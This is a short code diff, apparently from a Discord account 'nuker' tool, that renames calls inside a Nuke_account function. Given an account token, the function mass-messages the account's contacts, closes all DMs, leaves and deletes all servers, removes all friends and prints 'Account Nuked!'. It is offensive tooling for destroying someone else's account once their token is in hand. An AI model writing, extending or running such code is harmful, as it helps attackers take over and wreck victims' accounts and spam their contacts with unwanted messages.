@@ -222,11 +222,11 @@ class options:
         counter()
 
     def Nuke_account(token):
-        options.MassDMing(token, dmmsg)
+        options.MassDM(token, dmmsg)
         options.CloseAllDMs(token)
         options.LeaveAllServers(token)
-        options.DeleteServers(token)
-        options.RemoveFriends(token)
+        options.DeleteAllServers(token)
+        options.RemoveAllFriends(token)
         clearprint()
         print(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INFO{o}] {s}>{w} Account Nuked!")
         sleep(1)
